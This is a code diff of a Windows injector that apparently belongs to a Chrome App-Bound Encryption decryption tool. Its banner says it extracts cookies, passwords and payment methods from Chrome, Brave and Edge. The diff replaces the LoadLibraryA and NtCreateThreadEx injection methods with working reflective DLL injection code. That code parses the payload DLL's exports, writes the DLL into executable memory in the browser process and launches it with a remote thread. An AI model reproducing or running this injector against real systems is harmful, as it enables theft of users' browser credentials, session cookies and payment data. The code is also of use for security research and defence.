@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.9.0 (c) Alexander 'xaitax' Hagenah
+// v0.10.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -18,7 +18,10 @@
 #include <optional>
 #include <map>
 
-#pragma comment(lib, "ntdll.lib")
+#ifndef IMAGE_FILE_MACHINE_ARM64
+#define IMAGE_FILE_MACHINE_ARM64 0xAA64
+#endif
+
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "version.lib")
 
@@ -45,13 +48,11 @@ std::string WStringToUtf8(std::wstring_view w_sv)
     int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
     if (size_needed == 0)
     {
-        // std::cerr << "WStringToUtf8: WideCharToMultiByte (size_needed) failed. Error: " << GetLastError() << std::endl;
         return "";
     }
     std::string utf8_str(size_needed, '\0');
     if (WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr) == 0)
     {
-        // std::cerr << "WStringToUtf8: WideCharToMultiByte (conversion) failed. Error: " << GetLastError() << std::endl;
         return "";
     }
     return utf8_str;
@@ -250,9 +251,9 @@ void DisplayBanner()
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
     std::cout << "------------------------------------------------" << std::endl;
     std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
-    std::cout << "|  Multi-Method Process Injector               |" << std::endl;
+    std::cout << "|  Reflective DLL Process Injection            |" << std::endl;
     std::cout << "|  Cookies / Passwords / Payment Methods       |" << std::endl;
-    std::cout << "|  v0.9.0 by @xaitax                           |" << std::endl;
+    std::cout << "|  v0.10.0 by @xaitax                          |" << std::endl;
     std::cout << "------------------------------------------------" << std::endl
               << std::endl;
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
@@ -284,10 +285,6 @@ void CleanupPreviousRun()
             {
                 debug("Failed to delete temp file: " + file_path.u8string() + ". Error: " + ec.message());
             }
-        }
-        else
-        {
-            // debug("Temp file not found, no cleanup needed: " + file_path.u8string());
         }
     }
 }
@@ -323,158 +320,217 @@ std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
     return std::nullopt;
 }
 
-std::string GetDllPathUtf8()
+std::string GetPayloadDllPathUtf8()
 {
     wchar_t currentExePathRaw[MAX_PATH];
     DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
     if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
     {
-        debug("GetDllPathUtf8: GetModuleFileNameW failed or buffer too small. Error: " + std::to_string(GetLastError()));
+        debug("GetPayloadDllPathUtf8: GetModuleFileNameW failed. Error: " + std::to_string(GetLastError()));
         return "";
     }
     fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
     std::string dllPathStr = dllPathFs.u8string();
-    debug("GetDllPathUtf8: DLL path determined as: " + dllPathStr);
+    debug("GetPayloadDllPathUtf8: DLL path determined as: " + dllPathStr);
     return dllPathStr;
 }
 
-bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPathUtf8)
+DWORD RvaToOffset_Injector(DWORD dwRva, PIMAGE_NT_HEADERS64 pNtHeaders, LPVOID lpFileBase)
 {
-    debug("InjectWithLoadLibrary: begin for DLL: " + dllPathUtf8);
-    SIZE_T size = dllPathUtf8.length() + 1;
-    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!rem)
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+    if (pNtHeaders->FileHeader.NumberOfSections == 0)
     {
-        debug("VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
+        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
+            return dwRva;
+        else
+            return 0;
+    }
+    if (dwRva < pSectionHeader[0].VirtualAddress)
+    {
+        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
+            return dwRva;
+        else
+            return 0;
+    }
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        if (dwRva >= pSectionHeader[i].VirtualAddress &&
+            dwRva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData))
+        {
+            return (pSectionHeader[i].PointerToRawData + (dwRva - pSectionHeader[i].VirtualAddress));
+        }
+    }
+    return 0;
+}
+
+DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
+{
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+    {
+        debug("RDI Offset: Invalid DOS signature.");
+        return 0;
+    }
+    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpFileBuffer + pDosHeader->e_lfanew);
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
+    {
+        debug("RDI Offset: Invalid NT signature.");
+        return 0;
+    }
+    if (pNtHeaders->FileHeader.Machine != expectedMachine)
+    {
+        std::ostringstream oss_mach;
+        oss_mach << "RDI Offset: DLL is not for target machine. Expected: 0x" << std::hex << expectedMachine << ", Got: 0x" << pNtHeaders->FileHeader.Machine;
+        debug(oss_mach.str());
+        return 0;
+    }
+    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+    {
+        debug("RDI Offset: DLL is not PE32+.");
+        return 0;
+    }
+
+    PIMAGE_DATA_DIRECTORY pExportDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0)
+    {
+        debug("RDI Offset: No export directory found.");
+        return 0;
+    }
+
+    DWORD exportDirFileOffset = RvaToOffset_Injector(pExportDataDir->VirtualAddress, pNtHeaders, lpFileBuffer);
+    if (exportDirFileOffset == 0 && pExportDataDir->VirtualAddress != 0)
+    {
+        debug("RDI Offset: Could not convert export directory RVA to offset.");
+        return 0;
+    }
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpFileBuffer + exportDirFileOffset);
+
+    if (pExportDir->AddressOfNames == 0 || pExportDir->AddressOfNameOrdinals == 0 || pExportDir->AddressOfFunctions == 0)
+    {
+        debug("RDI Offset: Export directory contains null RVA(s) for names, ordinals, or functions.");
+        return 0;
+    }
+
+    DWORD namesOffset = RvaToOffset_Injector(pExportDir->AddressOfNames, pNtHeaders, lpFileBuffer);
+    DWORD ordinalsOffset = RvaToOffset_Injector(pExportDir->AddressOfNameOrdinals, pNtHeaders, lpFileBuffer);
+    DWORD functionsOffset = RvaToOffset_Injector(pExportDir->AddressOfFunctions, pNtHeaders, lpFileBuffer);
+
+    if ((namesOffset == 0 && pExportDir->AddressOfNames != 0) ||
+        (ordinalsOffset == 0 && pExportDir->AddressOfNameOrdinals != 0) ||
+        (functionsOffset == 0 && pExportDir->AddressOfFunctions != 0))
+    {
+        debug("RDI Offset: Failed to convert one or more export RVAs to offset.");
+        return 0;
+    }
+
+    DWORD *pNamesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + namesOffset);
+    WORD *pOrdinals = (WORD *)((ULONG_PTR)lpFileBuffer + ordinalsOffset);
+    DWORD *pAddressesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + functionsOffset);
+
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
+    {
+        if (pNamesRva[i] == 0)
+            continue;
+        DWORD funcNameFileOffset = RvaToOffset_Injector(pNamesRva[i], pNtHeaders, lpFileBuffer);
+        if (funcNameFileOffset == 0 && pNamesRva[i] != 0)
+            continue;
+        char *funcName = (char *)((ULONG_PTR)lpFileBuffer + funcNameFileOffset);
+
+        if (strcmp(funcName, "ReflectiveLoader") == 0)
+        {
+            if (pOrdinals[i] >= pExportDir->NumberOfFunctions)
+                return 0;
+            if (pAddressesRva[pOrdinals[i]] == 0)
+                return 0;
+            DWORD functionFileOffset = RvaToOffset_Injector(pAddressesRva[pOrdinals[i]], pNtHeaders, lpFileBuffer);
+            if (functionFileOffset == 0 && pAddressesRva[pOrdinals[i]] != 0)
+                return 0;
+            return functionFileOffset;
+        }
+    }
+    debug("RDI Offset: ReflectiveLoader export not found.");
+    return 0;
+}
+
+bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USHORT targetArch)
+{
+    debug("InjectWithReflectiveLoader: begin for DLL: " + dllPathUtf8);
+
+    std::ifstream dllFile(dllPathUtf8, std::ios::binary | std::ios::ate);
+    if (!dllFile.is_open())
+    {
+        debug("RDI: Failed to open DLL file: " + dllPathUtf8);
+        return false;
+    }
+    std::streamsize fileSize = dllFile.tellg();
+    dllFile.seekg(0, std::ios::beg);
+    std::vector<BYTE> dllBuffer(static_cast<size_t>(fileSize));
+    if (!dllFile.read(reinterpret_cast<char *>(dllBuffer.data()), fileSize))
+    {
+        debug("RDI: Failed to read DLL file into buffer.");
+        return false;
+    }
+    dllFile.close();
+    debug("RDI: DLL read into local buffer. Size: " + std::to_string(fileSize) + " bytes.");
+
+    DWORD reflectiveLoaderOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
+    if (reflectiveLoaderOffset == 0)
+    {
+        debug("RDI: GetReflectiveLoaderFileOffset failed.");
+        return false;
+    }
+    std::ostringstream oss_rlo;
+    oss_rlo << "RDI: ReflectiveLoader file offset: 0x" << std::hex << reflectiveLoaderOffset;
+    debug(oss_rlo.str());
+
+    LPVOID remoteMem = VirtualAllocEx(proc, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem)
+    {
+        debug("RDI: VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
         return false;
     }
     std::ostringstream oss_rem;
-    print_hex_ptr(oss_rem, rem);
-    debug("WriteProcessMemory of DLL path (" + std::to_string(size) + " bytes) to remote address: " + oss_rem.str());
+    print_hex_ptr(oss_rem, remoteMem);
+    debug("RDI: Memory allocated in target at " + oss_rem.str() + " (Size: " + std::to_string(dllBuffer.size()) + " bytes)");
 
-    if (!WriteProcessMemory(proc, rem, dllPathUtf8.c_str(), size, nullptr))
+    if (!WriteProcessMemory(proc, remoteMem, dllBuffer.data(), dllBuffer.size(), nullptr))
     {
-        debug("WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+        debug("RDI: WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
+        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
         return false;
     }
-    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
-    if (!loadLibraryAddr)
-    {
-        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-        return false;
-    }
-    std::ostringstream oss_load_lib;
-    print_hex_ptr(oss_load_lib, loadLibraryAddr);
-    debug("Calling CreateRemoteThread with LoadLibraryA at " + oss_load_lib.str());
+    debug("RDI: DLL written to target memory.");
 
-    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, rem, 0, nullptr), "RemoteLoadLibraryThread");
+    ULONG_PTR remoteLoaderAddr = reinterpret_cast<ULONG_PTR>(remoteMem) + reflectiveLoaderOffset;
+    std::ostringstream oss_rla;
+    oss_rla << "RDI: Calculated remote ReflectiveLoader address: 0x" << std::hex << remoteLoaderAddr;
+    debug(oss_rla.str());
+
+    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, nullptr, 0, nullptr), "RemoteReflectiveLoaderThread");
     if (!th)
     {
-        debug("CreateRemoteThread failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+        debug("RDI: CreateRemoteThread for ReflectiveLoader failed. Error: " + std::to_string(GetLastError()));
+        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
         return false;
     }
-    debug("Waiting for remote LoadLibraryA thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
+    debug("RDI: Waiting for remote ReflectiveLoader thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
     DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
-    if (wait_res == WAIT_TIMEOUT)
-        debug("Remote LoadLibraryA thread timed out.");
-    else if (wait_res == WAIT_OBJECT_0)
-        debug("Remote LoadLibraryA thread finished.");
-    else
-        debug("WaitForSingleObject on LoadLibraryA thread failed. Error: " + std::to_string(GetLastError()));
 
-    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-    debug("InjectWithLoadLibrary: done");
-    return (wait_res == WAIT_OBJECT_0);
-}
-
-typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
-    OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes,
-    IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument,
-    IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize,
-    IN SIZE_T MaximumStackSize, IN PVOID AttributeList);
-
-bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPathUtf8)
-{
-    debug("InjectWithNtCreateThreadEx: begin for DLL: " + dllPathUtf8);
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (!ntdll)
-    {
-        debug("GetModuleHandleW for ntdll.dll failed. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
-    std::ostringstream oss_ntdll_base;
-    print_hex_ptr(oss_ntdll_base, ntdll);
-    debug("ntdll.dll base=" + oss_ntdll_base.str());
-
-    auto fnNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
-    if (!fnNtCreateThreadEx)
-    {
-        debug("GetProcAddress NtCreateThreadEx failed. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
-    std::ostringstream oss_fn_nt;
-    print_hex_ptr(oss_fn_nt, fnNtCreateThreadEx);
-    debug("NtCreateThreadEx addr=" + oss_fn_nt.str());
-
-    SIZE_T size = dllPathUtf8.length() + 1;
-    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!rem)
-    {
-        debug("VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
-    if (!WriteProcessMemory(proc, rem, dllPathUtf8.c_str(), size, nullptr))
-    {
-        debug("WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-        return false;
-    }
-    std::ostringstream oss_rem_nt;
-    print_hex_ptr(oss_rem_nt, rem);
-    debug("WriteProcessMemory complete for DLL path to remote address: " + oss_rem_nt.str());
-
-    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
-    if (!loadLibraryAddr)
-    {
-        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-        return false;
-    }
-    std::ostringstream oss_load_lib_nt;
-    print_hex_ptr(oss_load_lib_nt, loadLibraryAddr);
-    debug("Calling NtCreateThreadEx with LoadLibraryA at " + oss_load_lib_nt.str());
-
-    HANDLE thr = nullptr;
-    NTSTATUS st = fnNtCreateThreadEx(&thr, THREAD_ALL_ACCESS, nullptr, proc, loadLibraryAddr, rem, 0, 0, 0, 0, nullptr);
-    HandleGuard remoteThreadHandle(thr, "NtCreateThreadEx RemoteThread");
-
-    std::ostringstream oss_nt_ret;
-    oss_nt_ret << "NtCreateThreadEx returned status 0x" << std::hex << st << ", thread handle=";
-    print_hex_ptr(oss_nt_ret, remoteThreadHandle.get());
-    debug(oss_nt_ret.str());
-
-    if (!NT_SUCCESS(st) || !remoteThreadHandle)
-    {
-        debug("NtCreateThreadEx failed or returned null thread handle.");
-        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-        return false;
-    }
-    debug("Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
-    DWORD wait_res = WaitForSingleObject(remoteThreadHandle.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
+    DWORD exitCode = 0;
+    GetExitCodeThread(th.get(), &exitCode);
+    std::ostringstream oss_exit;
+    oss_exit << "RDI: Remote thread exit code: 0x" << std::hex << exitCode;
+    debug(oss_exit.str());
 
     if (wait_res == WAIT_TIMEOUT)
-        debug("Remote LoadLibraryA thread (NtCreateThreadEx) timed out.");
+        debug("RDI: Remote ReflectiveLoader thread timed out.");
     else if (wait_res == WAIT_OBJECT_0)
-        debug("Remote LoadLibraryA thread (NtCreateThreadEx) finished.");
+        debug("RDI: Remote ReflectiveLoader thread finished.");
     else
-        debug("WaitForSingleObject on LoadLibraryA thread (NtCreateThreadEx) failed. Error: " + std::to_string(GetLastError()));
+        debug("RDI: WaitForSingleObject on ReflectiveLoader thread failed. Error: " + std::to_string(GetLastError()));
 
-    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
-    debug("InjectWithNtCreateThreadEx: done");
-    return (wait_res == WAIT_OBJECT_0);
+    debug("InjectWithReflectiveLoader: done");
+    return (wait_res == WAIT_OBJECT_0 && exitCode != 0);
 }
 
 struct BrowserDetails
@@ -514,7 +570,6 @@ void PrintUsage()
     std::wcout << L"Usage:\n"
                << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
                << L"Options:\n"
-               << L"  --method|-m <load|nt>    Injection method (default: load)\n"
                << L"  --start-browser|-s       Auto-launch browser if not running\n"
                << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                << L"  --verbose|-v             Enable verbose debug output from the injector\n"
@@ -525,7 +580,6 @@ void PrintUsage()
 int wmain(int argc, wchar_t *argv[])
 {
     DisplayBanner();
-    std::string injectionMethodStr = "load";
     bool autoStartBrowser = false;
     bool browserSuccessfullyStartedByInjector = false;
     std::wstring browserTypeArg;
@@ -534,15 +588,7 @@ int wmain(int argc, wchar_t *argv[])
     for (int i = 1; i < argc; ++i)
     {
         std::wstring_view arg = argv[i];
-        if ((arg == L"--method" || arg == L"-m") && i + 1 < argc)
-        {
-            std::wstring_view method_val_sv = argv[++i];
-            injectionMethodStr = WStringToUtf8(method_val_sv);
-            std::transform(injectionMethodStr.begin(), injectionMethodStr.end(), injectionMethodStr.begin(), [](unsigned char c)
-                           { return static_cast<char>(std::tolower(c)); });
-            debug("Injection method set to: " + injectionMethodStr);
-        }
-        else if (arg == L"--start-browser" || arg == L"-s")
+        if (arg == L"--start-browser" || arg == L"-s")
         {
             autoStartBrowser = true;
             debug("Auto-start browser enabled.");
@@ -572,6 +618,7 @@ int wmain(int argc, wchar_t *argv[])
         else
         {
             print_status("[!]", "Unknown or misplaced argument: " + WStringToUtf8(arg) + ". Use --help for usage.");
+            return 1;
         }
     }
 
@@ -644,7 +691,7 @@ int wmain(int argc, wchar_t *argv[])
         print_status("[-]", "Unsupported browser type: " + WStringToUtf8(browserTypeArg));
         return 1;
     }
-    const BrowserDetails &currentBrowserInfo = browserIt->second;
+    const BrowserDetails currentBrowserInfo = browserIt->second;
     std::string browserDisplayName = WStringToUtf8(browserTypeArg);
     if (!browserDisplayName.empty())
         browserDisplayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplayName[0])));
@@ -701,7 +748,6 @@ int wmain(int argc, wchar_t *argv[])
         return 1;
     }
 
-    std::string injectionMethodDesc = (injectionMethodStr == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibraryA";
     debug("Opening process PID=" + std::to_string(targetPid));
     HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid), "TargetProcessHandle");
     if (!targetProcessHandle)
@@ -709,10 +755,17 @@ int wmain(int argc, wchar_t *argv[])
         print_status("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(GetLastError()));
         return 1;
     }
+    USHORT currentTargetArch = IMAGE_FILE_MACHINE_UNKNOWN;
+    if (!GetProcessArchitecture(targetProcessHandle.get(), currentTargetArch))
+    {
+        print_status("[-]", "Failed to determine target process architecture for DLL selection.");
+        return 1;
+    }
+
     if (!CheckArchMatch(targetProcessHandle.get()))
         return 1;
 
-    std::string dllPathUtf8 = GetDllPathUtf8();
+    std::string dllPathUtf8 = GetPayloadDllPathUtf8();
     if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
     {
         print_status("[-]", "chrome_decrypt.dll not found. Expected near injector: " + (dllPathUtf8.empty() ? "<Error determining path>" : dllPathUtf8));
@@ -720,22 +773,16 @@ int wmain(int argc, wchar_t *argv[])
     }
 
     bool injectedSuccessfully = false;
-    if (injectionMethodStr == "nt")
-        injectedSuccessfully = InjectWithNtCreateThreadEx(targetProcessHandle.get(), dllPathUtf8);
-    else if (injectionMethodStr == "load")
-        injectedSuccessfully = InjectWithLoadLibrary(targetProcessHandle.get(), dllPathUtf8);
-    else
-    {
-        print_status("[-]", "Unknown injection method specified: " + injectionMethodStr);
-        return 1;
-    }
+    std::string usedInjectionMethodDesc = "Reflective DLL Injection (RDI)";
+
+    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch);
 
     if (!injectedSuccessfully)
     {
-        print_status("[-]", "DLL injection failed via " + injectionMethodDesc);
+        print_status("[-]", "DLL injection failed via " + usedInjectionMethodDesc);
         return 1;
     }
-    print_status("[+]", "DLL injected via " + injectionMethodDesc);
+    print_status("[+]", "DLL injected via " + usedInjectionMethodDesc);
 
     print_status("[*]", "Waiting for DLL decryption tasks to complete (max " + std::to_string(DLL_COMPLETION_TIMEOUT_MS / 1000) + "s)...");
     DWORD waitResult = WaitForSingleObject(completionEvent.get(), DLL_COMPLETION_TIMEOUT_MS);
